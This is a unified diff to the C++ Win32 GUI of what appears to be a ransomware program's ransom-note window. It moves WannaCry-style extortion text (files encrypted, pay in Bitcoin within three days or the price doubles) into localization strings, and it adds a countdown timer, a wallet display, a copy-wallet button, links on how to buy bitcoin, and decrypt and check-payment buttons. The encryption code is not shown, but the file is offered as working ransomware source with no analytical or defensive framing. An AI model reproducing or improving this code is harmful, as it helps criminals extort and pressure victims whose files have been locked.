@@ -1,23 +1,19 @@
 ﻿#include "Window.hpp"
-#include "DigitalFont.hpp"
-#include "bitmaps.hpp"
 #include "..\include\include.hpp"
+#include "resource.h"
+#include "localization.hpp"
 #include <stdexcept>
 #include <string.h>
 #include <Richedit.h>
-
-#define TEXT_HEADER L"What Happened to My Computer?"
-#define TEXT_HEADER2 L"Can I Recover My Files?"
-#define TEXT_HEADER3 L"How Do I Pay?"
-
-#define TEXT_PLACEHOLDER L"Your important files are encrypted. Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your files without our decryption service."
-#define TEXT_PLACEHOLDER2 L"Sure. We guarantee that you can recover all your files safely and easily. But you have not so enough time. You can decrypt some of your files for free. Try now by clicking <Decrypt>. But if you want to decrypt all your files, you need to pay. You only have 3 days to submit the payment. After that the price will be doubled."
-#define TEXT_PLACEHOLDER3 L"Payment is accepted in Bitcoin only. For more information, click <About bitcoin>. Please check the current price of Bitcoin and buy some bitcoins. For more information, click <How to buy bitcoins>. And send the correct amount to the address specified in this window. After your payment, click <Check Payment> button. We will check your payment and perform decryption. If you need our assistance, click <Support> button."
 
 using namespace gui;
 using namespace std::chrono;
 
 static HINSTANCE hInstRichEdit = NULL;
+static bool windowCreated = false;
+static bool isCustomCursor = false;
+
+#define GET_TEXT(text) Localization::getInstance().getText(text)
 
 LRESULT CALLBACK gui::Window::WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 {
@@ -25,54 +21,99 @@ LRESULT CALLBACK gui::Window::WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LP
     {
     case WM_CREATE:
     {
-        CREATESTRUCT* pCreate = reinterpret_cast<CREATESTRUCT*>(lParam);
-        SetWindowLongPtr(hwnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(pCreate->lpCreateParams));
-        return 0;
-    }
+        SetTimer(hwnd, UINT(Window::Widget::TIMER_UPDATE), 1010, NULL);
+    } break;
+    case WM_TIMER:
+    {
+        if (wParam == UINT(Window::Widget::TIMER_UPDATE))
+        {
+			Window::getInstance().updateTimer();
+		}
+    } break;
     case WM_COMMAND:
     {
         int wmId = LOWORD(wParam);
         int wmEvent = HIWORD(wParam);
+
+        if (wmId == (UINT)Widget::HYPERLINK_WHAT_IS_BTC and wmEvent == STN_CLICKED)
+        {
+            DBG_PRINT("Hyperlink: HYPERLINK_WHAT_IS_BTC");
+            ShellExecute(NULL, L"open", GET_TEXT(Localization::Text::LINK_1), NULL, NULL, SW_SHOWNORMAL);
+            DBG_PRINT("Opening link: %ls", GET_TEXT(Localization::Text::LINK_1));
+        }
+        else if (wmId == (UINT)Widget::HYPERLINK_HOW_TO_BUY and wmEvent == STN_CLICKED)
+        {
+            DBG_PRINT("Hyperlink: HYPERLINK_HOW_TO_BUY");
+            ShellExecute(NULL, L"open", GET_TEXT(Localization::Text::LINK_2), NULL, NULL, SW_SHOWNORMAL);
+            DBG_PRINT("Opening link: %ls", GET_TEXT(Localization::Text::LINK_2));
+        }
+
         switch (wmId)
         {
         case (UINT)Widget::CHECK_PAYMENT_BUTTON:
         {
-            DBG_PRINT("Button: CHECK_PAYMENT_BUTTON");
-            
+            DBG_PRINT("***Button: CHECK_PAYMENT_BUTTON");
+
         } break;
         case (UINT)Widget::FREE_DECRYPT_BUTTON:
         {
-            DBG_PRINT("Button: FREE_DECRYPT_BUTTON");
-            
+            DBG_PRINT("***Button: FREE_DECRYPT_BUTTON");
+
         } break;
+        case (UINT)Widget::COPY_BUTTON:
+        {
+			DBG_PRINT("Button: COPY_BUTTON");
+
+            std::wstring textToCopy = GET_TEXT(Localization::Text::BTC_WALLET);
+            if (OpenClipboard(hwnd))
+            {
+                EmptyClipboard();
+                HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, (textToCopy.size() + 1) * sizeof(wchar_t));
+                if (hGlob != NULL)
+                {
+                    void* pGlob = GlobalLock(hGlob);
+                    if (pGlob != NULL)
+                    {
+                        memcpy(pGlob, textToCopy.c_str(), (textToCopy.size() + 1) * sizeof(wchar_t));
+                        GlobalUnlock(hGlob);
+                        SetClipboardData(CF_UNICODETEXT, hGlob);
+                    }
+                    else GlobalFree(hGlob);
+                }
+                CloseClipboard();
+            }
+		} break;
         case (UINT)Widget::LANGUAGE_LIST_BOX:
         {
             if (wmEvent == CBN_SELCHANGE)
             {
                 auto& window = Window::getInstance();
+                auto selectedItemIndex = SendMessage(window.m_widgets[Widget::LANGUAGE_LIST_BOX], CB_GETCURSEL, 0, 0);
+                
+                if (Localization::getInstance().setLanguage(Localization::Language(selectedItemIndex + 1)))
+                {
+                    //Redraw all widgets
+                    for (auto& w : window.m_widgets)
+                        DestroyWindow(w.second);
 
-                int selectedItemIndex = SendMessage(window.m_widgets[Widget::LANGUAGE_LIST_BOX], CB_GETCURSEL, 0, 0);
+                    window.m_widgets.clear();
 
+                    window.redrawWidgets();
+                    SendMessage(window.m_widgets[Widget::LANGUAGE_LIST_BOX], CB_SETCURSEL, (WPARAM)selectedItemIndex, 0);
+
+                    InvalidateRect(hwnd, NULL, TRUE);
+                    UpdateWindow(hwnd);
+                }
+                
+#ifdef _DEBUG
                 WCHAR selectedLanguage[50];
                 SendMessage(window.m_widgets[Widget::LANGUAGE_LIST_BOX], CB_GETLBTEXT, selectedItemIndex, (LPARAM)selectedLanguage);
-
-                DBG_PRINT("Selected language: %ws", selectedLanguage);
+                DBG_PRINT("Selected language: %ls, id: %d", selectedLanguage, int(selectedItemIndex));
+#endif
             }
         } break;
         }
-    }
-    case WM_TIMER: 
-    {
-        switch (wParam) 
-        {
-        case (UINT)Widget::TIMER:
-        {
-            //pThis->updateTimer();
-            DBG_PRINT("Timer: TIMER");
-        } break;
-        }
-        return 0;
-    }
+    } break;
 
     case WM_CTLCOLORSTATIC: 
     {
@@ -80,96 +121,172 @@ LRESULT CALLBACK gui::Window::WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LP
         SetTextColor(hdcStatic, RGB(255, 255, 255));
         SetBkMode(hdcStatic, TRANSPARENT);
         return (INT_PTR)GetStockObject(NULL_BRUSH);
-    }
+    } break;
 
     case WM_PAINT:
     {
-        /*PAINTSTRUCT ps;
+        auto& window = Window::getInstance();
+
+        //Logos
+        PAINTSTRUCT ps;
         HDC hdc = BeginPaint(hwnd, &ps);
+        window.drawImage(hdc, Bitmap::LOGO, -14, 0, 1.f);
+        window.drawImage(hdc, Bitmap::BITCOIN, 200, 50 + 300 + 10 + 25 / 2);
+        window.drawImage(hdc, Bitmap::BITCOIN, 200 + 675 - 128, 50 + 300 + 10 + 25 / 2);
+        EndPaint(hwnd, &ps);
 
-        HDC hdcMem = CreateCompatibleDC(hdc);
-        auto& hBitmap = Window::getInstance().m_bitmaps[Bitmap::BITCOIN];
+        //Timer rect
+        window.drawRect(
+            10, 
+            220, 
+            180, 
+            130,
+			RGB(255, 255, 255));
+        window.drawText(GET_TEXT(Localization::Text::RANSOM_TIMER_1),
+            10 + 180 / 2,
+            460,
+            Fonts::TEXT, RGB(228, 244, 0), true); //yellow
+        window.drawText(GET_TEXT(Localization::Text::RANSOM_TIMER_2),
+            10 + 180 / 2,
+            500,
+            Fonts::TEXT, RGB(228, 244, 0), true); //yellow
+        window.drawText(GET_TEXT(Localization::Text::RANSOM_TIMER_3),
+            10 + 180 / 2,
+            615,
+            Fonts::LABEL, RGB(228, 244, 0), true); //yellow
 
-        SelectObject(hdcMem, hBitmap);
+        //BTC rect
+        window.drawRect(
+            200, 
+            50 + 300 + 10, 
+            675, 
+            45 + 25, 
+            RGB(255, 255, 255));
+        window.drawText(GET_TEXT(Localization::Text::RANSOM),
+            200 + 128 + 10, 
+            675 + 48, 
+            Fonts::TEXT, RGB(228, 244, 0)); //yellow
+        window.drawRect(
+            200 + 128 + 10, 
+            50 + 300 + 40, 
+            350 + 50, 
+            35, 
+            RGB(255, 255, 255));
+        window.drawText(GET_TEXT(Localization::Text::BTC_WALLET),
+            200 + 128 + 20, 
+            675 + 40 + 40 + 30, 
+            Fonts::TEXT, RGB(255, 255, 255));
 
-        BITMAP bm;
-        GetObject(hBitmap, sizeof(bm), &bm);
-
-        BitBlt(hdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
-
-        DeleteDC(hdcMem);
-        EndPaint(hwnd, &ps);*/
+        //Links
+        window.drawText(GET_TEXT(Localization::Text::HYPERLINK_1),
+            10, 
+            (50 + 300 + 80) * 2 - 90,
+            Fonts::HYPERLINK, RGB(70, 70, 255));
+        window.drawText(GET_TEXT(Localization::Text::HYPERLINK_2),
+            10,
+            (50 + 300 + 80) * 2 - 10,
+            Fonts::HYPERLINK, RGB(70, 70, 255));
 
     } break;
 
     case WM_CLOSE: DestroyWindow(hwnd); break;
 
     case WM_DESTROY: PostQuitMessage(0); break;
-
-    default: return DefWindowProc(hwnd, uMsg, wParam, lParam);
     }
-    
-    return 0;
+
+    return DefWindowProc(hwnd, uMsg, wParam, lParam);
 }
 
-HFONT gui::Window::createFont(int height, int width, std::vector<BYTE>* fontData)
+HFONT gui::Window::createFont(const std::wstring& fontName, int height, int weight, bool italic, bool strikeout, bool underline)
 {
-    if (!fontData)
-    {
-        return CreateFontW(
-            height, 0, 0, 0,
-            width, FALSE, FALSE, FALSE,
-            ANSI_CHARSET, OUT_DEFAULT_PRECIS,
-            CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
-            DEFAULT_PITCH | FF_DONTCARE, L"Arial");
-    }
+    return CreateFontW(
+        height, 0, 0, 0,
+        weight, (DWORD)italic, (DWORD)underline, (DWORD)strikeout,
+        ANSI_CHARSET, OUT_DEFAULT_PRECIS,
+        CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
+        DEFAULT_PITCH | FF_DONTCARE, fontName.c_str());
+}
 
-    DWORD numFonts = NULL;
-    HANDLE fontHandle = AddFontMemResourceEx(fontData->data(), static_cast<DWORD>(fontData->size()), NULL, &numFonts);
-    if (fontHandle == NULL)
-        return nullptr;
+std::wstring gui::Window::timeToString(const std::chrono::seconds& time)
+{
+    auto days = static_cast<int>(std::chrono::duration_cast<std::chrono::days>(time).count());
+    auto hours = static_cast<int>(std::chrono::duration_cast<std::chrono::hours>(time % std::chrono::days(1)).count());
+    auto minutes = static_cast<int>(std::chrono::duration_cast<std::chrono::minutes>(time % std::chrono::hours(1)).count());
+    auto seconds = static_cast<int>(std::chrono::duration_cast<std::chrono::seconds>(time % std::chrono::minutes(1)).count());
 
-    LOGFONT lf = { 0 };
-    wcscpy_s(lf.lfFaceName, LF_FACESIZE, L"SFDigitalReadout-Medium");
-    lf.lfHeight = height;
-    lf.lfWidth = width;
-    return CreateFontIndirect(&lf);
+    std::wstring result;
+    result.reserve(11);
+
+    wsprintf(&result[0], L"%02d:%02d:%02d:%02d", days, hours, minutes, seconds);
+    return result;
 }
 
 void gui::Window::updateTimer()
 {
     auto remainingTime = duration_cast<seconds>(m_endTime - steady_clock::now());
-    auto hwnd = m_widgets[Widget::TIMER];
+    auto countdownText = timeToString(remainingTime);
+
     if (remainingTime.count() <= 0) 
     {
-        KillTimer(hwnd, 1);
         DBG_PRINT("Timer stopped!");
+        SetWindowText(GetDlgItem(m_window, int(Widget::TIMER)), countdownText.c_str());
+        RECT rect;
+        GetClientRect(m_window, &rect);
+        InvalidateRect(m_window, &rect, TRUE);
+        KillTimer(m_window, UINT(Widget::TIMER_UPDATE));
         return;
     }
 
-    int days = duration_cast<std::chrono::days>(remainingTime).count();
-    int hours = duration_cast<std::chrono::hours>(remainingTime % std::chrono::days(1)).count();
-    int minutes = duration_cast<std::chrono::minutes>(remainingTime % std::chrono::hours(1)).count();
-    int seconds = duration_cast<std::chrono::seconds>(remainingTime % std::chrono::minutes(1)).count();
-
-    wchar_t countdownText[100];
-    wsprintf(countdownText, L"%02d:%02d:%02d:%02d", days, hours, minutes, seconds);
-
-    SetWindowText(GetDlgItem(hwnd, int(Widget::TIMER)), countdownText);
+    SetWindowText(GetDlgItem(m_window, int(Widget::TIMER)), countdownText.c_str());
+    RECT rect;
+    GetClientRect(m_window, &rect);
+    InvalidateRect(m_window, &rect, TRUE);
 }
 
-void gui::Window::drawLabel(const std::wstring& text)
+void gui::Window::drawLabel()
 {
-    HWND hwndLabelMainMessage = CreateWindow(L"STATIC", text.c_str(),
+    m_widgets[Widget::LABEL] = CreateWindow(L"STATIC", GET_TEXT(Localization::Text::TITLE),
         WS_CHILD | WS_VISIBLE | SS_CENTER,
-        200, 10, 510, 30,
+        150, 10, 610, 30,
         m_window, nullptr, m_windowClass.hInstance, nullptr);
-    SendMessage(hwndLabelMainMessage, WM_SETFONT, WPARAM(m_fonts[Fonts::LABEL]), TRUE);
+    SendMessage(m_widgets[Widget::LABEL], WM_SETFONT, WPARAM(m_fonts[Fonts::LABEL]), TRUE);
+}
+
+void gui::Window::drawTimer()
+{
+    m_widgets[Widget::TIMER] = CreateWindow(L"STATIC", timeToString(m_expirationTime).c_str(),
+        WS_CHILD | WS_VISIBLE | SS_CENTER,
+        10, 280, 180, 30,
+        m_window, (HMENU)Widget::TIMER, m_windowClass.hInstance, nullptr);
+    SendMessage(m_widgets[Widget::TIMER], WM_SETFONT, WPARAM(m_fonts[Fonts::TIMER]), TRUE);
+}
+
+void gui::Window::drawLinks()
+{
+    m_widgets[Widget::HYPERLINK_WHAT_IS_BTC] = CreateWindow(
+        L"STATIC",
+        L"",
+        WS_VISIBLE | WS_CHILD | SS_NOTIFY,
+        10, 50 + 300 + 40, 180, 30,
+        m_window, (HMENU)Widget::HYPERLINK_WHAT_IS_BTC,
+        m_windowClass.hInstance,
+        NULL);
+    SendMessage(m_widgets[Widget::HYPERLINK_WHAT_IS_BTC], WM_SETFONT, WPARAM(m_fonts[Fonts::HYPERLINK]), TRUE);
+
+    m_widgets[Widget::HYPERLINK_HOW_TO_BUY] = CreateWindow(
+        L"STATIC",
+        L"",
+        WS_VISIBLE | WS_CHILD | SS_NOTIFY,
+        10, 50 + 300 + 80, 200, 30,
+        m_window, (HMENU)Widget::HYPERLINK_HOW_TO_BUY,
+        m_windowClass.hInstance,
+        NULL);
+    SendMessage(m_widgets[Widget::HYPERLINK_HOW_TO_BUY], WM_SETFONT, WPARAM(m_fonts[Fonts::HYPERLINK]), TRUE);
 }
 
 void gui::Window::drawRichText()
 {
-    HWND hwndRichEdit = CreateWindowEx(
+    m_widgets[Widget::TEXT_BOX] = CreateWindowEx(
         WS_EX_CLIENTEDGE,
         MSFTEDIT_CLASS,
         L"",
@@ -180,7 +297,9 @@ void gui::Window::drawRichText()
         m_windowClass.hInstance,
         nullptr);
 
-    SendMessage(hwndRichEdit, WM_SETFONT, WPARAM(m_fonts[Fonts::TEXT_BOX]), TRUE);
+    auto& hwnd = m_widgets[Widget::TEXT_BOX];
+
+    SendMessage(hwnd, WM_SETFONT, WPARAM(m_fonts[Fonts::TEXT_BOX]), TRUE);
 
     CHARFORMAT2 cf;
     ZeroMemory(&cf, sizeof(cf));
@@ -188,7 +307,7 @@ void gui::Window::drawRichText()
     cf.dwMask = CFM_BOLD | CFM_SIZE | CFM_FACE;
     cf.dwEffects = CFE_BOLD | CFE_ITALIC;
     cf.yHeight = 16 * 20;
-    wcscpy_s(cf.szFaceName, L"Arial");
+    wcscpy_s(cf.szFaceName, L"Tahoma");
 
     auto setText = [&](const std::wstring& text, bool header, bool newLine) -> void
     {
@@ -200,25 +319,25 @@ void gui::Window::drawRichText()
         else
         {
             cf.dwEffects = CFE_ITALIC;
-            cf.yHeight = 14 * 20;
+            cf.yHeight = 12 * 20;
         }
 
-		SendMessage(hwndRichEdit, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);
-		SendMessage(hwndRichEdit, EM_REPLACESEL, FALSE, (LPARAM)text.c_str());
+		SendMessage(hwnd, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);
+		SendMessage(hwnd, EM_REPLACESEL, FALSE, (LPARAM)text.c_str());
 		if (newLine)
-			SendMessage(hwndRichEdit, EM_REPLACESEL, FALSE, (LPARAM)L"\r\n");
+			SendMessage(hwnd, EM_REPLACESEL, FALSE, (LPARAM)L"\r\n");
 	};
 
-    setText(TEXT_HEADER, true, true);
-    setText(TEXT_PLACEHOLDER, false, true);
-    SendMessage(hwndRichEdit, EM_REPLACESEL, FALSE, (LPARAM)L"\r\n");
+    setText(GET_TEXT(Localization::Text::HEADER), true, true);
+    setText(GET_TEXT(Localization::Text::PLACEHOLDER), false, true);
+    SendMessage(hwnd, EM_REPLACESEL, FALSE, (LPARAM)L"\r\n");
 
-    setText(TEXT_HEADER2, true, true);
-    setText(TEXT_PLACEHOLDER2, false, true);
-    SendMessage(hwndRichEdit, EM_REPLACESEL, FALSE, (LPARAM)L"\r\n");
+    setText(GET_TEXT(Localization::Text::HEADER2), true, true);
+    setText(GET_TEXT(Localization::Text::PLACEHOLDER2), false, true);
+    SendMessage(hwnd, EM_REPLACESEL, FALSE, (LPARAM)L"\r\n");
 
-    setText(TEXT_HEADER3, true, true);
-    setText(TEXT_PLACEHOLDER3, false, false);
+    setText(GET_TEXT(Localization::Text::HEADER3), true, true);
+    setText(GET_TEXT(Localization::Text::PLACEHOLDER3), false, false);
 }
 
 void gui::Window::drawListBox()
@@ -228,7 +347,7 @@ void gui::Window::drawListBox()
         L"COMBOBOX",
         L"",
         CBS_DROPDOWNLIST | WS_CHILD | WS_VISIBLE | WS_TABSTOP | WS_VSCROLL,
-        200 + 450 + 60 + 14, 10, 150, 300,
+        200 + 450 + 134, 10 + 5, 90, 300,
         m_window,
         (HMENU)Widget::LANGUAGE_LIST_BOX,
         m_windowClass.hInstance,
@@ -237,26 +356,121 @@ void gui::Window::drawListBox()
     auto& listBoxWnd = m_widgets[Widget::LANGUAGE_LIST_BOX];
 
     SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"English");
-    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"Polski");
-    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"Español");
-    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"Français");
-    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"Deutsch");
+    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"Polish");
+    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"Spanish");
+    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"French");
+    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"German");
+    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"Russian");
 
     SendMessage(listBoxWnd, CB_SETCURSEL, (WPARAM)0, 0);
 }
 
+void gui::Window::drawButtons()
+{
+    m_widgets[Widget::FREE_DECRYPT_BUTTON] = CreateWindow(L"BUTTON", GET_TEXT(Localization::Text::BUTTON_FREE),
+        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
+        200, 50 + 300 + 10 + 45 + 10 + 25, 320, 30,
+        m_window, (HMENU)Widget::FREE_DECRYPT_BUTTON, m_windowClass.hInstance, nullptr);
+    SendMessage(m_widgets[Widget::FREE_DECRYPT_BUTTON], WM_SETFONT, WPARAM(m_fonts[Fonts::BUTTON]), TRUE);
+
+    m_widgets[Widget::CHECK_PAYMENT_BUTTON] = CreateWindow(L"BUTTON", GET_TEXT(Localization::Text::BUTTON_CHECK),
+        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
+        200 + 150 + 50 + 150 + 5, 50 + 300 + 10 + 45 + 10 + 25, 320, 30,
+        m_window, (HMENU)Widget::CHECK_PAYMENT_BUTTON, m_windowClass.hInstance, nullptr);
+    SendMessage(m_widgets[Widget::CHECK_PAYMENT_BUTTON], WM_SETFONT, WPARAM(m_fonts[Fonts::BUTTON]), TRUE);
+
+    m_widgets[Widget::COPY_BUTTON] = CreateWindow(L"BUTTON", GET_TEXT(Localization::Text::BUTTON_COPY),
+        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
+        200 + 150 + 300 + 25, 50 + 300 + 45, 60, 25,
+        m_window, (HMENU)Widget::COPY_BUTTON, m_windowClass.hInstance, nullptr);
+    SendMessage(m_widgets[Widget::COPY_BUTTON], WM_SETFONT, WPARAM(m_fonts[Fonts::BUTTON]), TRUE);
+
+}
+
+void gui::Window::drawImage(HDC hdc, const Bitmap& bitmap, int x, int y, float scale, int w, int h)
+{
+    BITMAP _bitmap;
+    const auto& srcImg = m_bitmaps[bitmap];
+    size_t memSize = sizeof(srcImg);
+    HDC hdcMem = CreateCompatibleDC(hdc);
+    
+    SelectObject(hdcMem, srcImg);
+    GetObject(srcImg, sizeof(_bitmap), &_bitmap);
+
+    if (w <= 0) w = _bitmap.bmWidth;
+    if (h <= 0) h = _bitmap.bmHeight;
+
+    int scaledWidth = static_cast<int>(w * scale);
+    int scaledHeight = static_cast<int>(h * scale);
+
+    StretchBlt(hdc, x, y, scaledWidth, scaledHeight, hdcMem, 0, 0, _bitmap.bmWidth, _bitmap.bmHeight, SRCCOPY);
+
+    DeleteDC(hdcMem);
+}
+
+void gui::Window::drawRect(int x, int y, int w, int h, COLORREF color, bool solid)
+{
+    HDC hdc = GetDC(m_window);
+
+    HBRUSH hBrush = CreateSolidBrush(color);
+
+    SelectObject(hdc, hBrush);
+
+    RECT rect{ x, y, x + w, y + h };
+    solid ? Rectangle(hdc, x, y, x + w, y + h) : FrameRect(hdc, &rect, hBrush);
+
+    DeleteObject(hBrush);
+    ReleaseDC(m_window, hdc);
+}
+
+void gui::Window::drawText(const std::wstring& text, int x, int y, const Fonts& font, COLORREF color, bool center)
+{
+    HDC hdc = GetDC(m_window);
+    HFONT oldFont = (HFONT)SelectObject(hdc, m_fonts[font]);
+
+    SetTextColor(hdc, color);
+    SetBkMode(hdc, TRANSPARENT);
+
+    SIZE size;
+    GetTextExtentPoint32(hdc, text.c_str(), lstrlenW(text.c_str()), &size);
+    RECT rect = { x, y, (LONG)m_windowSize[0], size.cy + 8};
+    DWORD flags = DT_LEFT | DT_SINGLELINE | DT_VCENTER;
+    if (center)
+    {
+		rect.left = x - size.cx / 2;
+		rect.right = x + size.cx / 2;
+		flags = DT_CENTER | DT_SINGLELINE | DT_VCENTER;
+	}
+    DrawText(hdc, text.c_str(), -1, &rect, flags);
+
+    SelectObject(hdc, oldFont);
+    ReleaseDC(m_window, hdc);
+}
+
 void gui::Window::createImages()
 {
-    auto loadBitmap = [&](std::vector<BYTE>* bitmapData) -> HBITMAP
-    {
-        BITMAPFILEHEADER* bmfh = reinterpret_cast<BITMAPFILEHEADER*>(bitmapData->data());
-        BITMAPINFO* bmi = reinterpret_cast<BITMAPINFO*>(bitmapData->data() + sizeof(BITMAPFILEHEADER));
+    m_bitmaps[Bitmap::LOGO] = LoadBitmap(GetModuleHandleA(NULL), MAKEINTRESOURCE(IDB_BITMAP2));
+    m_bitmaps[Bitmap::BITCOIN] = LoadBitmap(GetModuleHandleA(NULL), MAKEINTRESOURCE(IDB_BITMAP1));
+}
 
-        BYTE* _bitmapData = bitmapData->data() + bmfh->bfOffBits;
-        return CreateDIBSection(NULL, bmi, DIB_RGB_COLORS, (void**)&_bitmapData, NULL, 0);
-	};
+RECT gui::Window::getWidgetRect(const Widget& widget)
+{
+    RECT rect;
+    HWND hCtrl = GetDlgItem(m_window, int(widget));
+    GetWindowRect(hCtrl, &rect);
+    ScreenToClient(m_window, (LPPOINT)&rect.left);
+    ScreenToClient(m_window, (LPPOINT)&rect.right);
+    return rect;
+}
 
-    m_bitmaps[Bitmap::BITCOIN] = loadBitmap(&bitcoin_map);
+void gui::Window::redrawWidgets()
+{
+    drawLabel();
+    drawRichText();
+    drawListBox();
+    drawButtons();
+    drawTimer();
+    drawLinks();
 }
 
 gui::Window::Window()
@@ -268,11 +482,8 @@ gui::Window::Window()
     catch (const std::exception& e)
     {
 		DBG_PRINT("%s", e.what());
-		throw;
+        throw e;
 	}
-    
-    ShowWindow(m_window, SW_SHOWDEFAULT);
-    UpdateWindow(m_window);
 }
 
 gui::Window::~Window()
@@ -283,7 +494,7 @@ gui::Window::~Window()
     for (auto& bitmap : m_bitmaps)
         DeleteObject(bitmap.second);
 
-    //DeleteObject(hLogoImage);
+    KillTimer(m_window, UINT(Widget::TIMER_UPDATE));
     DeleteObject(m_bgBrush);
 	DestroyWindow(m_window);
 	UnregisterClass(m_label.c_str(), m_windowClass.hInstance);
@@ -293,7 +504,10 @@ gui::Window::~Window()
 
 void gui::Window::show()
 {
-    MSG msg;
+    ShowWindow(m_window, SW_SHOWDEFAULT);
+    UpdateWindow(m_window);
+
+    MSG msg{};
     while (GetMessage(&msg, NULL, 0, 0)) 
     {
         TranslateMessage(&msg);
@@ -303,8 +517,7 @@ void gui::Window::show()
 
 void gui::Window::createWindow()
 {
-    m_endTime = steady_clock::now() + days(7);
-    SetTimer(m_window, UINT(Widget::TIMER), 1000, NULL);
+    m_endTime = steady_clock::now() + m_expirationTime;
     m_bgBrush = CreateSolidBrush(m_bgColor);
     m_windowClass = 
     {
@@ -344,13 +557,15 @@ void gui::Window::createWindow()
         m_windowSize[0], m_windowSize[1],
         NULL, NULL, m_windowClass.hInstance, NULL);
 
-    if (!m_window)
+    if (not m_window)
         throw std::runtime_error("Failed to create window.");
 
-    m_fonts[Fonts::TIMER] = createFont(30, 0, &digitalFontData);
-    m_fonts[Fonts::LABEL] = createFont(30, FW_EXTRABOLD);
-    m_fonts[Fonts::TEXT_BOX] = createFont(20, FW_LIGHT);
-    m_fonts[Fonts::BUTTON] = createFont(20, 0);
+    m_fonts[Fonts::TIMER] = createFont(L"Sagoe UI", 36, FW_NORMAL, false, false, true);
+    m_fonts[Fonts::LABEL] = createFont(L"Tahoma", 32, FW_EXTRABOLD);
+    m_fonts[Fonts::TEXT_BOX] = createFont(L"Tahoma", 16, FW_LIGHT);
+    m_fonts[Fonts::BUTTON] = createFont(L"Tahoma", 14, FW_EXTRABOLD);
+    m_fonts[Fonts::TEXT] = createFont(L"Tahoma", 18, FW_HEAVY);
+    m_fonts[Fonts::HYPERLINK] = createFont(L"Aharoni", 20, FW_HEAVY, false, false, true);
 
     createImages();
 
@@ -364,28 +579,7 @@ void gui::Window::createWindow()
     if (hInstRichEdit == NULL) 
         throw std::runtime_error("Failed to load Msftedit library.");
 
-    drawLabel(L"Ooops, your files have been encrypted!");
+    redrawWidgets();
 
-    drawRichText();
-
-    drawListBox();
-
-    m_widgets[Widget::FREE_DECRYPT_BUTTON] = CreateWindow(L"BUTTON", L"Decrypt",
-        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
-        200, 360, 150, 30,
-        m_window, (HMENU)Widget::FREE_DECRYPT_BUTTON, m_windowClass.hInstance, nullptr);
-    SendMessage(m_widgets[Widget::FREE_DECRYPT_BUTTON], WM_SETFONT, WPARAM(m_fonts[Fonts::TEXT_BOX]), TRUE);
-
-    m_widgets[Widget::CHECK_PAYMENT_BUTTON] = CreateWindow(L"BUTTON", L"Check Payment",
-        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
-        200 + 150 + 50, 360, 150, 30,
-        m_window, (HMENU)Widget::CHECK_PAYMENT_BUTTON, m_windowClass.hInstance, nullptr);
-    SendMessage(m_widgets[Widget::CHECK_PAYMENT_BUTTON], WM_SETFONT, WPARAM(m_fonts[Fonts::TEXT_BOX]), TRUE);
-
-    m_widgets[Widget::TIMER] = CreateWindow(L"STATIC", L"99:59:59:59",
-        WS_CHILD | WS_VISIBLE | SS_CENTER,
-        10, 200, 180, 30,
-        m_window, (HMENU)Widget::TIMER, m_windowClass.hInstance, nullptr);
-    SendMessage(m_widgets[Widget::TIMER], WM_SETFONT, WPARAM(m_fonts[Fonts::TIMER]), TRUE);
-
+    windowCreated = true;
 }
